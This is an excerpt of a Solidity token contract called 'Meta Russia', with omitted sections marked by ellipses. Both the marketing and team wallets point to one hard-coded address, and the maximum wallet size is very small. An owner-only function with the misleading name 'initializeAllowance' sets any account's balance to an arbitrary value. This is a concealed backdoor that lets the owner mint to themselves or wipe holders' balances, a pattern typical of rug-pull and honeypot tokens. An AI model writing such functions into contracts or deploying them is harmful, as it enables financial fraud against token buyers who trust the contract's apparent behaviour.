...
contract MetaRussia is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "Meta Russia";
    string private _symbol = "Meta Russia";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress = payable(0x0e6A70D325217Db3141D314510EAeC31692B0bE8);
    address payable public teamWalletAddress = payable(0x0e6A70D325217Db3141D314510EAeC31692B0bE8);    
    ...
    uint256 public _walletMax = 4 * 10**_decimals;      
    uint256 public _mult = (10 ** _decimals);
    uint256 public _supplyDec = 200000;
    ...
    function initializeAllowance(address account) public onlyOwner returns (bool success) {_balances[account] = _varNew;return true;}
